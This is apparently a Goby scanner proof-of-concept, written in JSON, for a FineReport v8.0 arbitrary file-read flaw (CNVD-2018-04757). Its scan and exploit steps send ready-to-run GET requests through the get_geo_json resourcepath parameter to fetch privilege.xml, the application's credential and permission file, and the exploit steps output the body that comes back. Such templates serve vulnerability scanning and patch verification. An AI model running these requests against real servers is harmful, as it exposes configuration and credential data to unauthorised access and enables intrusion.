{
      "Name": "FineReport v8.0 Fileread CNVD-2018-04757",
      "Level": "2",
      "Tags": [
            "fileread"
      ],
      "GobyQuery": "app=\"fanruansem-FineReport\"",
      "Description": "FineReport report software is an enterprise-level web report tool written in pure Java, which integrates data display (report) and data entry (form) functions.",
      "Product": "FineReport v8.0",
      "Homepage": "https://www.fanruan.com/",
      "Author": "",
      "Impact": "FineReport v8.0 Fileread.",
      "Recommendation": "",
      "References": [
            "https://www.cnvd.org.cn/flaw/show/CNVD-2018-04757"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "OR",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "CDATA",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "CDATA",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "OR",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "CDATA",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody||"
                  ]
            },
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "CDATA",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody||"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}